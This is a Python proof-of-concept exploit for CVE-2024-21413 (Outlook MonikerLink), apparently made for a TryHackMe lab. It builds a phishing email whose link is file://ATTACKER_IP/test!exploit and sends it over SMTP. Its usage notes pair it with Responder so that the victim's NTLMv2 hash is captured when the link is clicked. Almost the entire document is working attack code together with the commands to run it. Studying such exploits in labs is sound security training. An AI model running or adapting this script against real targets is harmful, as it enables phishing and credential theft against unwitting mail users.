'''
Source: CMNatic | https://github.com/cmnatic
Version: 1.1 | 13/03/2024

You need to change:
1 - Replace ATTACKER_IP in the HTML payload with your machine IP
2 - Replace MAILSVERIP with your SMTP mail server address

Usage:
1. Start Responder on your attacker machine to capture NTLM hashes:
   sudo responder -I eth0

2. Run the script to send the crafted email:
   python3 outlook_cve_21413_poc.py

3. When the victim clicks the malicious link in Outlook, their machine
   will attempt SMB authentication to ATTACKER_IP, and Responder will
   capture the NTLMv2 hash.
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_IP/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSVERIP', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\nEmail delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
